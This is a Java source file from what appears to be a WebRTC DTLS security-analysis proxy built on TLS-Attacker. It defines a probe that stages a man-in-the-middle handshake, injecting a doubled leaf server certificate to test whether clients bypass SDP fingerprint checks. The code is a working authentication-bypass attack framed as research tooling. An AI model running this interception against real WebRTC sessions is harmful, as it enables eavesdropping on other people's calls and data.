/*
 * WebRTC-DTLS-Analysis-Proxy
 *
 * Copyright 2022-2025 Technology Innovation Institute (TII), Abu Dhabi
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.dtlsproxy.probes.rtp.dtlsbypass;

import de.rub.nds.dtlsproxy.action.DynamicCertificateInjectionAction;
import de.rub.nds.dtlsproxy.config.ProxyConfiguration;
import de.rub.nds.dtlsproxy.enums.WebRtcProperties;
import de.rub.nds.dtlsproxy.report.WebRtcPlatformReport;
import de.rub.nds.dtlsproxy.util.TraceUtil;
import de.rub.nds.dtlsproxy.util.X509Util;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.protocol.message.*;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.*;
import de.rub.nds.x509attacker.filesystem.CertificateBytes;
import java.util.List;

public class DoubleLeafServerCertBypass extends AuthBypass {

    private final boolean realFirst;

    public DoubleLeafServerCertBypass(boolean realFirst) {
        super("present double leaf server certificate to client, ignore server", true, false);
        this.realFirst = realFirst;
    }

    /**
     * Creates a trace based on the assumption that the client accepts certificates not matching the
     * SDP fingerprinting if the actual server certificate is included
     *
     * <pre>
     *
     * Client                    MitM                  Server
     * -------------------------------------------------------
     * |---ClientHello--->|    Forward     |--->ClientHello->|
     * |<---ServerHello---|  ForwardTill   |<---ServerHello--|
     * |<----CERT**-------| DynamicInject  |<---CERT---------|
     * |<--------SKE------|  SendDynamic
     * |<---CertRequest---|     Send
     * |<-ServerHelloDone-|     Send
     * |----FINISHED----->| Receive Till
     * |<-----CCS,FIN-----|     Send
     *
     * </pre>
     */
    public WorkflowTrace createTrace(
            WebRtcPlatformReport report, ProxyConfiguration proxyConfiguration) {

        Config config = createConfig(proxyConfiguration, report);

        // set default cert chain to null for TLS-Attacker to use custom chain in CertificateMessage
        // instead
        config.setDefaultExplicitCertificateChain((List<CertificateBytes>) null);

        WorkflowTrace trace =
                TraceUtil.createMitmEntryTrace(
                        config,
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        report);

        trace.addTlsAction(
                new ForwardMessagesAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        ATTACKER_TO_SERVER_CONNECTION,
                        new ClientHelloMessage()));
        trace.addTlsAction(
                new TightForwardTillAction(
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new ServerHelloMessage()));
        trace.addTlsAction(
                new DynamicCertificateInjectionAction(
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        realFirst,
                        true));
        // the original one
        trace.addTlsAction(new SendDynamicServerKeyExchangeAction(CLIENT_TO_ATTACKER_CONNECTION));
        trace.addTlsAction(
                new SendAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new CertificateRequestMessage(config),
                        new ServerHelloDoneMessage()));
        trace.addTlsAction(
                new ReceiveTillAction(CLIENT_TO_ATTACKER_CONNECTION, new FinishedMessage()));

        TraceUtil.optionallyAddSessionTicketMessage(trace, report, CLIENT_TO_ATTACKER_CONNECTION);

        // send Attacker FIN to victim
        trace.addTlsAction(
                new SendAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new ChangeCipherSpecMessage(),
                        new FinishedMessage()));
        return trace;
    }

    @Override
    public Config createConfig(ProxyConfiguration configuration, WebRtcPlatformReport report) {
        Config config = super.createConfig(configuration, report);
        X509Util.applySupportedSignatureAndHashAlgorithm(config, report, true);
        return config;
    }

    @Override
    public boolean isApplicable(WebRtcPlatformReport report) {

        if (!basicExecutionRequirementsMet(report)) {
            return false;
        }
        if (!isTrue(report, WebRtcProperties.SERVER_REQUESTS_CERTIFICATE)) {
            return false;
        }

        if (realFirst) {
            if (!isFalse(report, WebRtcProperties.CLIENT_REJECTS_DOUBLE_LEAF_TRICK_REAL_ATTACKER)) {
                return false;
            }
        } else {
            if (!isFalse(report, WebRtcProperties.CLIENT_REJECTS_DOUBLE_LEAF_TRICK_ATTACKER_REAL)) {
                return false;
            }
        }

        return true;
    }
}
